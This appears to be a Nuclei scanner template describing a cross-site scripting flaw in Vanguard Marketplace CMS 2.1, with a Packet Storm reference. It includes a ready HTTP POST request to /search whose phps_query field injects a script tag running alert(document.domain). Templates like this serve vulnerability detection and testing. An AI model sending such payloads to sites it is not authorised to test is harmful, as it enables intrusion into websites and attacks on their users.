# Nuclei Template: Vanguard Marketplace CMS 2.1 - Cross-Site Scripting
**Template ID:** vanguard-post-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`vanguard-post-xss.yaml`)

## Vulnerability Information & PoC

## Description
Vanguard Marketplace CMS 2.1 contains a cross-site scripting vulnerability in the message and product title tags and in the product search box.

## Steps to reproduce / Exploit Payload
```http
POST /search HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- https://packetstormsecurity.com/files/157099/Vanguard-2.1-Cross-Site-Scripting.html
